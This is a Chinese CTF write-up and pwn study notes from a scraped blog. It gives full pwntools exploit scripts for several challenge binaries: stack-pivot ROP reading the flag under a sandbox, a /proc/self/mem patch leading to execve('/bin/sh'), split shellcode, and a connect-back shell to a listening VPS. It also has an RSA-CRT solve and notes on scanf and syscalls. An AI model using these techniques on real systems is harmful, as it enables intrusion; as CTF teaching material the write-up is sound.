p.sendline(b&#x27;1&#x27;) 这里打本地更方便，直接在相对路径下创建一个json文件，修改里面的分数，直接就可打通 Maze_Rustrust只是迷惑人的，直接执行看看 1是生成地图，3是走迷宫，但是无法走动，输入2会发现给了hint，神秘的四位数字，这里可以在ida里找到 也可以在萌物百科里找到（本来以为是0d00的） 输入0721后问我们stage2是什么 这里我们发现迷宫可以通过wasd控制走动了，只要走出迷宫这题也就结束了 本题不需要exp ReRead看看ida吧，开了沙盒 八字节的溢出，想到了栈迁移，检查流程走一遍吧 有one_gadget,开了沙盒允许open，read，write,dup2函数执行，但是read函数第一个参数必须是0，这个也算个提示吧，使用orw获取flag 思路：通过栈迁移够着rop链泄露某个函数libc地址，通过计算得到libc基地址后，计算出各个需要的函数地址，然后控制流返回read，构造一个可写入字节数更大的read，再向bss段写入orw，通过栈迁移再次执行 第一种方法，利用dup2(3,0)将open返回的文件描述符修改，可以read第一个参数是0，就可以读取到flag里的内容了 第二种方法，由于012都用做标准输入输出，报错占用了，所以文件描述都是从3开始的，倘若我们再open之前close(0)之后，再进行open的话，那么文件描述符就是0了，这样的话就可以read了。 tips:这里的open，openat需要自己构造，不然就会出现奇奇怪怪的错误，比如寄存器混乱，这里的syscall后面需要有ret 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 45257filename=&#x27;./read&#x27;a=0if a: p=remote(&#x27;39.106.48.123&#x27;,42877)else: p=process(filename) gdb.attach(p) elf=ELF(filename)libc=ELF(&#x27;./libc.so.6&#x27;)bss=0x404500leave=0x4013CFread=0x4013AC pop_rdi=0x401473ret=0x40101a #pop_rsi_r15=0x401471 gadget1=0x40146Agadget2=0x401450puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]p.recvuntil(b&#x27;\\x98\\x8b\\x0a&#x27;)pause()payload=b&#x27;a&#x27;*0x40+p64(bss)+p64(read)p.send(payload)p.recvuntil(b&#x27;done!\\n&#x27;)payload=p64(bss+0x100)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read)+p64(leave)+b&#x27;/flag\\x00\\x00\\x00&#x27;payload=payload.ljust(0x40,b&#x27;a&#x27;)+p64(bss-0x40)+p64(leave)p.send(payload)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&#x27;puts_addr:&#x27;,hex(puts_addr))libc_base=puts_addr-libc.sym.putspop_rdx_r12=libc_base+0x119431pop_rsi=libc_base+0x2601fpop_rax=libc_base+0x36174 open_addr=libc_base+libc.sym.openread_addr=libc_base+libc.sym.readdup2_addr=libc_base+libc.sym.dup2write_addr=libc_base+libc.sym.writeclose_addr=libc_base+libc.sym.closesyscall_addr=libc_base+0x630A9payload=p64(bss+0x200)payload+=p64(pop_rsi)+p64(bss+0x200-0x100)+p64(pop_rdx_r12)+p64(0x500)+p64(0)+p64(0x04013B8)+p64(leave)+p64(bss+0x100-0x40)+p64(leave)p.send(payload)#第一段close(0),使用open打开flag文件payload=p64(bss)payload+=p64(pop_rdi)+p64(0)+p64(close_addr)payload+=p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(bss-0x10)+p64(pop_rsi)+p64(0)+p64(pop_rdx_r12)+p64(1)+p64(0)+p64(syscall_addr)payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x300)+p64(write_addr)payload=payload.ljust(0x100,b&#x27;a&#x27;)+p64(bss+0x100)+p64(leave)#第二段 dup(3,0)，使用openat打开flag文件&quot;&quot;&quot;payload+=p64(pop_rax)+p64(257)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss-0x10)+p64(pop_rdx_r12)+p64(0)+p64(0)+p64(syscall_addr)payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0)+p64(dup2_addr)payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x300)+p64(write_addr)payload=payload.ljust(0x100,b&#x27;a&#x27;)+p64(bss+0x100)+p64(leave)&quot;&quot;&quot;p.recvuntil(b&#x27;done!\\n&#x27;)p.send(payload)p.recv()#p.recv()p.interactive() MakeHero直接ida看看 func1通过&#x2F;proc&#x2F;self&#x2F;mem修改某段地址的内容，不需要该段拥有可写权限，func2提供了代码段地址，libc段地址，第一次输入写入栈中，这里很明显是给了代码段附件地址修改一字节，以及libc段修改一字节的机会，这里我们动态调试看看 我们第一次输入会存在rsp+0x10处，接着我们需要选择修改，这里既然修改不需要可写全写，那我们可以直接修改code段的某个call或者jmp指令，控制程序流转到我们想要的地方 恰好这里就存在这么一个jmp，我们可以修改它，让他跳到附近的地方，附近也恰好有这么一个gadget，控制程序流转到我们写入的rop中利用add rsp,8 往下压栈，但是我们只能让rsp-0x8，还有一段0x8段的空间怎么办呢 这里我们发现填入需要的修改的地址，恰好存在了rsp-0x8处，这里我就有了思路，在第二段修改中写入ret的地址，既可以完全控制程序流，执行我们第一次写入的rop链 思路：第一次输入写入rop链，第二输入修改code段jmp使其跳转到sub rsp,8 ret处以便控制程序流，第三次输入ret函数地址 ，最后即可执行我们写入的rop获取shell 以下是完整exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#101.200.139.65 34825filename=&#x27;./h&#x27;a=0if a: p=remote(&#x27;101.200.139.65&#x27;,34825)else: p=process(filename) gdb.attach(p) elf=ELF(filename)libc=ELF(&#x27;./libc.so.6&#x27;)p.recvuntil(&quot;** &quot;)addr1=int(p.recv(14),16)p.recvuntil(&quot; - &quot;)p.recvuntil(&quot;## &quot;) #addr2=int(p.recv(14),16)-0x28000addr2=int(p.recv(14),16)print(hex(addr1))print(hex(addr2))system_addr=addr2 + libc.sym[&#x27;system&#x27;]binsh =addr2 + next(libc.search(b&#x27;/bin/sh&#x27;))rdi = addr2 + 0x2a3e5rsi = addr2 + 0x2be51rdx_r12 = addr2+ 0x11f2e7ret = addr1 + 0x101arax = addr2 + 0x045eb0#syscall =addr2+0x091316syscall =addr2+0x29db4oneg = [0xebc81, 0xebc85, 0xebc88,0xebce2, 0xebd38, 0xebd3f, 0xebd43]one = addr2 + oneg[2]# 18cc 182e = 9e no# 18cc 1852 + 2 -&gt; 78#one4 = addr2 + oneg[4]#三个myname都可取得shell#myname1=flat(ret,rdx_r12,0,0,one4)myname2=flat(rax,59,rdi,binsh,rsi,0,rdx_r12,0,0,syscall)#myname3=flat(rsi,0, rdx_r12,0,0,one)p.sendlineafter(b&#x27;: &#x27;, myname2)targ = addr1 + 0x1852 + 1payload = hex(targ)+ &#x27; &#x27; + hex(0x78)p.sendlineafter(b&#x27;\\x81\\x0a&#x27;, payload.encode())payload = hex(ret)+ &#x27; &#x27; + hex(1)p.sendlineafter(b&#x27;\\xef\\xbc\\x81\\x0a&#x27;, payload.encode())p.interactive() week5pwnSimple_Shellcode功能很简单，输入shellcode，运行shellcode ida看的出来一次只能输入8个字节的东西，运行就是正常的运行，但是不给输入不可见字符，苦思冥想也没想出来，后面测试出来了 这里我发送了30遍，只有15个不能输入非字母的提示，所以可以看出第二次输入不会被限制，这里就好办了 开了沙盒，没有禁架构，可以转32位，也可以64位这里我写出来几个 64位openat，mmap，writev，这里writev的第二参数是数组，所以我们要构造一个数组 第二种就是转完32位直接orw 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128from pwn import *from LibcSearcher import *#8.147.132.32 13663filename=&#x27;./s&#x27;a=0context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)if a: io=remote(&#x27;8.147.132.32&#x27;,13663)else: io=process(filename) #gdb.attach(io)elf=ELF(filename)s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda num=None: io.recv(num)ru = lambda text : io.recvuntil(text)rl = lambda : io.recvline()tb = lambda num : str(num).encode()uu32 = lambda flag=b&#x27;\\n&#x27;, off=1, len=4: u32((r(flag) if isinstance(flag,int) else ru(flag))[-off-len:-off].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda flag=b&#x27;\\n&#x27;, off=1, len=8: u64((r(flag) if isinstance(flag,int) else ru(flag))[-off-len:-off].ljust(8, b&quot;\\x00&quot;)) # recive Bytes numberrx = lambda nos=b&#x27;\\n&#x27;, off=1, len=None: int((r(nos)if isinstance(nos,int) else ru(nos))[-off-len if isinstance(len,int) else 0:-off],16) # recive Hex numberlg = lambda x, flag=None: log.info(f&quot;&#123;flag if flag else&#x27;,&#x27;.join([k for k,v in globals().items() if v==x])&#125;:\\t&#123;x:#x&#125;&quot;if isinstance(x,int)else x) # output Valueia = lambda : io.interactive()def se(item): ru(b&quot;\\x6e\\x3a\\x20&quot;) sl(b&quot;1&quot;) ru(b&quot;\\xa4\\x3a\\x20&quot;) sl(item) ru(b&quot;\\x6e\\x3a\\x20&quot;) sl(b&quot;1&quot;) ru(b&quot;\\xa4\\x3a\\x20&quot;) sl(item) shell=&quot;&quot;&quot; xor rax,rax mov rsp,rbp mov eax, 0x67616c66 push rax xor rax,rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 mov ax,0x101 syscall mov rsi, 0x1000 mov r10,1 mov r9d, 0 mov r8d, eax mov edx, 1 /*共享映射*/ mov edi, 0x2333000 mov rax, 9 syscall push 1 pop rdi push 0x100 pop rdx push rbx mov rsi, 0xd000788 push 20 pop rax syscall &quot;&quot;&quot;shell1 = b&quot;\\x48\\x31\\xC0\\x48\\x89\\xEC\\xB8\\x66&quot;shell2 = b&quot;\\x6C\\x61\\x67\\x50\\x48\\x31\\xC0\\x48&quot;shell3 = b&quot;\\x31\\xFF\\x48\\x83\\xEF\\x64\\x48\\x89&quot;shell4 = b&quot;\\xE6\\x31\\xD2\\x4D\\x31\\xD2\\x66\\xB8&quot;shell5 = b&quot;\\x01\\x01\\x0F\\x05\\x48\\xC7\\xC6\\x00&quot;shell6 = b&quot;\\x10\\x00\\x00\\x49\\xC7\\xC2\\x01\\x00&quot;shell7 = b&quot;\\x00\\x00\\x41\\xB9\\x00\\x00\\x00\\x00&quot;shell8 = b&quot;\\x41\\x89\\xC0\\xBA\\x01\\x00\\x00\\x00&quot;shell9 = b&quot;\\xBF\\x00\\x30\\x33\\x02\\x48\\xC7\\xC0&quot;shell10 = b&quot;\\x09\\x00\\x00\\x00\\x0F\\x05\\x6A\\x01&quot;shell11 = b&quot;\\x5F\\x68\\x00\\x01\\x00\\x00\\x5A\\x53&quot;shell12 = b&quot;\\x48\\xC7\\xC6\\x88\\x07\\x00\\x0D\\x6A&quot;shell13 = b&quot;\\x14\\x58\\x0F\\x05\\x00\\x00\\x00&quot;shell14 = b&quot;\\x00\\x30\\x33\\x02\\x00\\x00\\x00\\x00&quot;shell15 = b&quot;\\x40&quot;se(shell1)se(shell2)se(shell3)se(shell4)se(shell5)se(shell6)se(shell7)se(shell8)se(shell9)se(shell10)se(shell11)se(shell12)se(shell13)se(shell14)se(shell15)ru(b&quot;option: &quot;)#gdb.attach(io)sl(b&quot;2&quot;)ia()&quot;&quot;&quot;xor rsp,rspmov esp,0xd000200mov DWORD PTR [esp+4],0x23mov DWORD PTR [esp],0xd000732 #这里是需要返回地址retfd&quot;&quot;&quot;&quot;&quot;&quot;xor rsp,rspmov esp,0xd000200push 0x23push 0xd00732 #这里是需要返回地址retfq&quot;&quot;&quot; No Output直接反编译看看，oh，no，close(0)close(1)close(2) 尝试了各种方法输出到其他终端 侧信道爆破 结果是都没用，于是在网上搜到了类似的题，使用socket shellcode+socket本地进程通信 | Pwn进你的心 (ywhkkx.github.io) Getshell远程：真·RCE 正连？反连？不连？ | Clang裁缝店 (xuanxuanblingbling.github.io) 深入理解 pwn 题中的正连&#x2F;反连 tcp | blingbling’s blog (blingblingxuanxuan.github.io) 但是怎么都不出来，后来发现是我的本地没出网只能去借个vps了 一个攻击，一个nc -lvp 端口监听 公网ip不方便透露，结尾感谢一波 以下是exp 12345678910111213141516from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#8.147.132.32 37451#sh = listen(44453)#io=process(&#x27;./o&#x27;)io = remote(&quot;8.147.132.32&quot;,29399)#shellcode = asm(shellcraft.connect(&#x27;0.0.0.0&#x27;,4443,&#x27;ipv4&#x27;)+shellcraft.dupsh())shellcode =asm(&quot;mov rsp,0xd000900&quot;)shellcode += asm(shellcraft.connect(&#x27;0.0.0.0&#x27;,44453)+shellcraft.dupsh())io.sendline(shellcode)#sh.wait_for_connection()io.interactive()#sh.recv() flag{898a5e4c-a3de-405e-83da-d0bd940e4eab} Crypto没e也能玩week5还有这么多解的题，下载下来问ai出了 12345678910111213141516171819202122232425262728# 已知数值c = 312026920216195772014255984174463085443866592575942633449581804171108045852080517840578408476885673600123673447592477875543106559822653280458539889975125069364584140981069913341705738633426978886491359036285144974311751490792757751756044409664421663980721578870582548395096887840688928684149014816557276765747135567714257184475027270111822159712532338590457693333403200971556224662094381891648467959054115723744963414673861964744567056823925630723343002325605154661959863849738333074326769879861280895388423162444746726568892877802824353858845944856881876742211956986853244518521508714633279380808950337611574412909p = 108043725609186781791705090463399988837848128384507136697546885182257613493145758848215714322999196482303958182639388180063206708575175264502030010971971799850889123915580518613554382722069874295016841596099030496486069157061211091761273568631799006187376088457421848367280401857536410610375012371577177832001q = 121590551121540247114817509966135120751936084528211093275386628666641298457070126234836053337681325952068673362753408092990553364818851439157868686131416391201519794244659155411228907897025948436021990520853498462677797392855335364006924106615008646396883330251028071418465977013680888333091554558623089051503dp = 11282958604593959665264348980446305500804623200078838572989469798546944577064705030092746827389207634235443944672230537015008113180165395276742807804632116181385860873677969229460704569172318227491268503039531329141563655811632035522134920788501646372986281785901019732756566066694831838769040155501078857473dq = 46575357360806054039250786123714177813397065260787208532360436486982363496441528434309234218672688812437737096579970959403617066243685956461527617935564293219447837324227893212131933165188205281564552085623483305721400518031651417947568896538797580895484369480168587284879837144688420597737619751280559493857# 步骤1：计算 m_p 和 m_qmp = pow(c, dp, p)mq = pow(c, dq, q)# 步骤2：计算 q 在 p 模下的模反元素，并使用CRT合并结果q_inv = pow(q, -1, p) # 计算模反h = (q_inv * (mp - mq)) % pm = mq + h * q# 步骤3：将解密的整数转换为字节def int_to_bytes(n): # 使用一个字节数组来表示整数的字节形式 byte_array = [] while n &gt; 0: byte_array.append(n &amp; 0xFF) n &gt;&gt;= 8 return bytes(byte_array[::-1])flag = int_to_bytes(m)print(flag)#flag&#123;No_course_e_can_play&#125; flag{No_course_e_can_play} 感谢感谢我好大哥，Walt orz","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"","slug":"数据结构","date":"2024-09-24T07:42:22.489Z","updated":"2024-10-18T11:46:26.049Z","comments":true,"path":"2024/09/24/数据结构/","permalink":"http://example.com/2024/09/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"","text":"python数据结构时间复杂度 数据结构与算法（Python） | 数据结构与算法（Python） (huangmj.com)","categories":[],"tags":[]},{"title":"note","slug":"exp","date":"2024-09-13T03:12:20.826Z","updated":"2024-10-28T03:57:23.339Z","comments":true,"path":"2024/09/13/exp/","permalink":"http://example.com/2024/09/13/exp/","excerpt":"","text":"expnote学习文档路线123456https://www.cnblogs.com/wintrysec/p/10616856.html#ZQFaaCnR #pwn脱坑路线https://www.yuque.com/hxfqg9 #语雀学习文档https://blog.csdn.net/qq_54218833?type=blog #很强的博主 csdnhttps://xz.aliyun.com/t/4205?time__1311=n4%2Bxni0QG%3DDQtAKDtD%2F8W4BKGQRC32YrRDY5qQx #ida的使用教程https://www.anquanke.com/post/id/163971#h2-1 #堆介绍https://www.cnblogs.com/LynneHuan/p/17822108.html#工具专题 shellcode 专题 house of 专题 高版本堆利用专题 CTF中常见的C语言输入函数截断属性总结12345678910111213141516函数 截断字符 截断属性 截断字符是否保留 截断后加read(0,a,0x100) EOF 无 无 无*a = getchar() EOF 无 无 无scanf(&quot;%c&quot;,a) EOF 无 无 无scanf(&quot;%s&quot;,a) EOF 0x09 0x0A 0x0B 0x0C 0x0D 0x20 截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面 不保留 0x00sscanf(a,&quot;%s&quot;,b) 0x00 0x09 0x0A 0x0B 0x0C 0x0D 0x20 截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面 不保留 0x00gets(a) EOF 0x0A 截断字符前无论有无有效内容均截断 不保留 0x00fgets(a,256,stdin) EOF 0x0A 截断字符前无论有无有效内容均截断 保留 0x00sscanf(a,&quot;%[^;];&quot;,b) 0x00 0x3B 无 不保留 0x00sprintf(b,&quot;%s&quot;,a) 0x00 无 保留 无（相当于截断字符不保留，截断后加0x00）strcpy(b,a) 0x00 无 保留 无（相当于截断字符不保留，截断后加0x00）strcat(b,a) 0x00 无 保留 无（相当于截断字符不保留，截断后加0x00）strncat(b,a,0x10) 0x00 无 保留 无（相当于截断字符不保留，截断后加0x00）strncat(b,a,0x10) 到达拷贝长度 无 保留 如果到达拷贝长度，则自动补上0x00当然EOF不是字符，是读取结束，linux在命令行里ctrl+D即可发送EOF给程序 scanf的小秘密123456789101112131415161718192021222324252627282930313233正常输入时，输入为范围在-2147483648~2147483647内的整数。如果输入范围在-9223372036854775808~9223372036854775807内的整数，则会截断高位读取，此范围是long long int的范围。如果输入范围在long long int范围之外，则统一将参数赋值为-1（0xFFFFFFFF）如果输入为非数字，分为下列情况：– （1） 如果输入仅有一个，则该输入无效，该值不变。– （2） 如果输入有数字前缀（如12345abcd），则scanf仅会读取前面的数字，从第一个非数字开始，后面全部舍弃（12345）。– （3） 如果输入有多个且使用一个scanf语句（如scanf(“%d, %d”, &amp;a, &amp;b)）。输入第一个非数字后，后面的所有输入均为无效，前面的输入可以赋值。– （4） 如果输入有多个且使用多个scanf语句（含循环，即一个scanf中仅有一个输入），则输入非数字时，如果输入的不是’+’或’-’，则后面紧跟的所有scanf均自动跳过，变为无效，不能输入。如果输入的是’+’或’-’，则会跳过当前输入，后面仍然可以进行输入。参数%u、%lld、%llu、%x、%llx、%f、%llf与%d相似，均具有%d参数的性质4，对于前面的性质受到输入对象所占字节的长度的影响参数%c%c参数的输入较为特殊，由于输入时换行符也被作为字符读入，因此如果直接使用scanf(“%c”, &amp;a)可能会影响后面的scanf输入，因为即使只是输入了一个字符，加上换行后，当前scanf执行完毕后缓冲区中还有一个换行符。如果下一个scanf仍是%c的话就会将此处的值赋值为’\\n’。那么如果使用scanf(“%c\\n”, &amp;a)呢？测试的结果是：使用循环输入时，比如一共输入4次，第一次输入’1’后回车，scanf仍然在等待输入，输入’2’加回车后，第一个scanf结束读取，第一个元素被赋值为’1’，但第二个元素未被赋值。如此下去，输入第四个元素’4’后加回车，最后一个scanf仍在读取，只有再次输入一个无效值并回车后才能对第4个元素赋值。注意：使用for循环或while循环时scanf的写效果不仅限于指向的地址。其附加效果如下几种情况：（注意：如下情况仅适用于数组在栈区的情况，在堆区使用malloc分配的chunk没有这个效果） 循环的条件控制变量为整型（含char, unsigned char, short, unsigned short, int, unsigned int, long, unsigned long, long long, unsigned long long，其实int等同于long），如for(int i=0; i&lt;3; i++)与while(i&lt;4)： 对数组arr中的值赋值时（无论顺序如何，无论i如何变，无论一个循环体中有多少个scanf），若数组的长度为m，则在输入读取结束后scanf会对arr[m]中的值进行修改。修改方式为：当前循环中的任意一个scanf结束执行后，其会将arr[m]的结果赋值为控制for循环的整型变量的最低8位，如当i=1时，在循环体中的scanf执行后，arr[m]会被赋值为1，但当i=257时，arr[m]也会被赋值为1（截断至最低8位）。 循环的条件控制变量为浮点型（含float, double），如for(double i=0.5; i&lt;3.5; i+=1)： 正常对数组中的元素赋值，不存在（1）中的效果。 其他条件： 同（2）（未经测试，但应该是这样的）其他%c的输入姿势：scanf(“ %c”, &amp;a)或scanf(“\\n%c”, &amp;a)或scanf(“\\t%c”, &amp;a)：这种输入能够避免scanf(“%c\\n”, &amp;a)中多输入一个无效字符的小bug，输入一个字符后能够立即对元素进行赋值并等待下一次scanf再次输入。个人认为原因应该在于：输入第一个字符时，由于字符前面并没有输入换行符，因此读取该字符后还会读取一个换行符，但这个换行符就正好对应于第二次scanf中前面的这个\\n。既避免了误读取换行符，又避免了无效输入（这种解释只适用于scanf(“\\n%c”, &amp;a)，至于其他两种情况我也说不上来是为啥，可能只有源码能给我们答案了）参数%s%s参数在PWN题中的应用应该是最常见的了。scanf(“%s”, a)实际上与gets一样危险，均不会检查a的边界，出现在题中一定是一个可以进行栈溢出或堆溢出的重点。这里注意其与read函数相同，可以读取\\x00后面的内容，仅将换行作为输入读取的结束标志。不过这里要注意的是，%s参数会以空格作为分隔符，也就是说，如果输入中含有空格，那么空格前后的内容会被分配到不同的%s参数中。这一点在使用scanf进行溢出时需要注意，否则容易造成ROP链断裂等问题。 栈知识12345678910111213141516171832位直接把所有参数接在return_addr后面64位先依次放入rdi, rsi, rdx, rcx, r8, r9，如果还有多余的参数才接到return_addr后面函数调用时栈空间操作的最基本情况 -&gt; 函数调用：callpush eip# 函数返回地址压入栈内，此时rsp自动减去0x8push rbp # 保存父函数栈底指针到栈内，此时rsp自动减去0x8mov rbp,rsp # 设置被调用函数的栈底指针sub rsp,xxx # 分配栈空间 leave # 相当于下方指令进行的操作 mov rsp,rbp ## 释放之前分配的栈空间 pop rbp ## 从栈上取出之前保存的父函数栈底指针到rbp，此时rsp自动加上0x8ret pop eip# 从栈上取出返回地址，然后返回，此时rsp自动加上0x8 系统调用号12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138232位#ifndef _ASM_X86_UNISTD_32_H#define _ASM_X86_UNISTD_32_H 1#define __NR_restart_syscall 0#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16#define __NR_break 17#define __NR_oldstat 18#define __NR_lseek 19#define __NR_getpid 20#define __NR_mount 21#define __NR_umount 22#define __NR_setuid 23#define __NR_getuid 24#define __NR_stime 25#define __NR_ptrace 26#define __NR_alarm 27#define __NR_oldfstat 28#define __NR_pause 29#define __NR_utime 30#define __NR_stty 31#define __NR_gtty 32#define __NR_access 33#define __NR_nice 34#define __NR_ftime 35#define __NR_sync 36#define __NR_kill 37#define __NR_rename 38#define __NR_mkdir 39#define __NR_rmdir 40#define __NR_dup 41#define __NR_pipe 42#define __NR_times 43#define __NR_prof 44#define __NR_brk 45#define __NR_setgid 46#define __NR_getgid 47#define __NR_signal 48#define __NR_geteuid 49#define __NR_getegid 50#define __NR_acct 51#define __NR_umount2 52#define __NR_lock 53#define __NR_ioctl 54#define __NR_fcntl 55#define __NR_mpx 56#define __NR_setpgid 57#define __NR_ulimit 58#define __NR_oldolduname 59#define __NR_umask 60#define __NR_chroot 61#define __NR_ustat 62#define __NR_dup2 63#define __NR_getppid 64#define __NR_getpgrp 65#define __NR_setsid 66#define __NR_sigaction 67#define __NR_sgetmask 68#define __NR_ssetmask 69#define __NR_setreuid 70#define __NR_setregid 71#define __NR_sigsuspend 72#define __NR_sigpending 73#define __NR_sethostname 74#define __NR_setrlimit 75#define __NR_getrlimit 76#define __NR_getrusage 77#define __NR_gettimeofday 78#define __NR_settimeofday 79#define __NR_getgroups 80#define __NR_setgroups 81#define __NR_select 82#define __NR_symlink 83#define __NR_oldlstat 84#define __NR_readlink 85#define __NR_uselib 86#define __NR_swapon 87#define __NR_reboot 88#define __NR_readdir 89#define __NR_mmap 90#define __NR_munmap 91#define __NR_truncate 92#define __NR_ftruncate 93#define __NR_fchmod 94#define __NR_fchown 95#define __NR_getpriority 96#define __NR_setpriority 97#define __NR_profil 98#define __NR_statfs 99#define __NR_fstatfs 100#define __NR_ioperm 101#define __NR_socketcall 102#define __NR_syslog 103#define __NR_setitimer 104#define __NR_getitimer 105#define __NR_stat 106#define __NR_lstat 107#define __NR_fstat 108#define __NR_olduname 109#define __NR_iopl 110#define __NR_vhangup 111#define __NR_idle 112#define __NR_vm86old 113#define __NR_wait4 114#define __NR_swapoff 115#define __NR_sysinfo 116#define __NR_ipc 117#define __NR_fsync 118#define __NR_sigreturn 119#define __NR_clone 120#define __NR_setdomainname 121#define __NR_uname 122#define __NR_modify_ldt 123#define __NR_adjtimex 124#define __NR_mprotect 125#define __NR_sigprocmask 126#define __NR_create_module 127#define __NR_init_module 128#define __NR_delete_module 129#define __NR_get_kernel_syms 130#define __NR_quotactl 131#define __NR_getpgid 132#define __NR_fchdir 133#define __NR_bdflush 134#define __NR_sysfs 135#define __NR_personality 136#define __NR_afs_syscall 137#define __NR_setfsuid 138#define __NR_setfsgid 139#define __NR__llseek 140#define __NR_getdents 141#define __NR__newselect 142#define __NR_flock 143#define __NR_msync 144#define __NR_readv 145#define __NR_writev 146#define __NR_getsid 147#define __NR_fdatasync 148#define __NR__sysctl 149#define __NR_mlock 150#define __NR_munlock 151#define __NR_mlockall 152#define __NR_munlockall 153#define __NR_sched_setparam 154#define __NR_sched_getparam 155#define __NR_sched_setscheduler 156#define __NR_sched_getscheduler 157#define __NR_sched_yield 158#define __NR_sched_get_priority_max 159#define __NR_sched_get_priority_min 160#define __NR_sched_rr_get_interval 161#define __NR_nanosleep 162#define __NR_mremap 163#define __NR_setresuid 164#define __NR_getresuid 165#define __NR_vm86 166#define __NR_query_module 167#define __NR_poll 168#define __NR_nfsservctl 169#define __NR_setresgid 170#define __NR_getresgid 171#define __NR_prctl 172#define __NR_rt_sigreturn 173#define __NR_rt_sigaction 174#define __NR_rt_sigprocmask 175#define __NR_rt_sigpending 176#define __NR_rt_sigtimedwait 177#define __NR_rt_sigqueueinfo 178#define __NR_rt_sigsuspend 179#define __NR_pread64 180#define __NR_pwrite64 181#define __NR_chown 182#define __NR_getcwd 183#define __NR_capget 184#define __NR_capset 185#define __NR_sigaltstack 186#define __NR_sendfile 187#define __NR_getpmsg 188#define __NR_putpmsg 189#define __NR_vfork 190#define __NR_ugetrlimit 191#define __NR_mmap2 192#define __NR_truncate64 193#define __NR_ftruncate64 194#define __NR_stat64 195#define __NR_lstat64 196#define __NR_fstat64 197#define __NR_lchown32 198#define __NR_getuid32 199#define __NR_getgid32 200#define __NR_geteuid32 201#define __NR_getegid32 202#define __NR_setreuid32 203#define __NR_setregid32 204#define __NR_getgroups32 205#define __NR_setgroups32 206#define __NR_fchown32 207#define __NR_setresuid32 208#define __NR_getresuid32 209#define __NR_setresgid32 210#define __NR_getresgid32 211#define __NR_chown32 212#define __NR_setuid32 213#define __NR_setgid32 214#define __NR_setfsuid32 215#define __NR_setfsgid32 216#define __NR_pivot_root 217#define __NR_mincore 218#define __NR_madvise 219#define __NR_getdents64 220#define __NR_fcntl64 221#define __NR_gettid 224#define __NR_readahead 225#define __NR_setxattr 226#define __NR_lsetxattr 227#define __NR_fsetxattr 228#define __NR_getxattr 229#define __NR_lgetxattr 230#define __NR_fgetxattr 231#define __NR_listxattr 232#define __NR_llistxattr 233#define __NR_flistxattr 234#define __NR_removexattr 235#define __NR_lremovexattr 236#define __NR_fremovexattr 237#define __NR_tkill 238#define __NR_sendfile64 239#define __NR_futex 240#define __NR_sched_setaffinity 241#define __NR_sched_getaffinity 242#define __NR_set_thread_area 243#define __NR_get_thread_area 244#define __NR_io_setup 245#define __NR_io_destroy 246#define __NR_io_getevents 247#define __NR_io_submit 248#define __NR_io_cancel 249#define __NR_fadvise64 250#define __NR_exit_group 252#define __NR_lookup_dcookie 253#define __NR_epoll_create 254#define __NR_epoll_ctl 255#define __NR_epoll_wait 256#define __NR_remap_file_pages 257#define __NR_set_tid_address 258#define __NR_timer_create 259#define __NR_timer_settime 260#define __NR_timer_gettime 261#define __NR_timer_getoverrun 262#define __NR_timer_delete 263#define __NR_clock_settime 264#define __NR_clock_gettime 265#define __NR_clock_getres 266#define __NR_clock_nanosleep 267#define __NR_statfs64 268#define __NR_fstatfs64 269#define 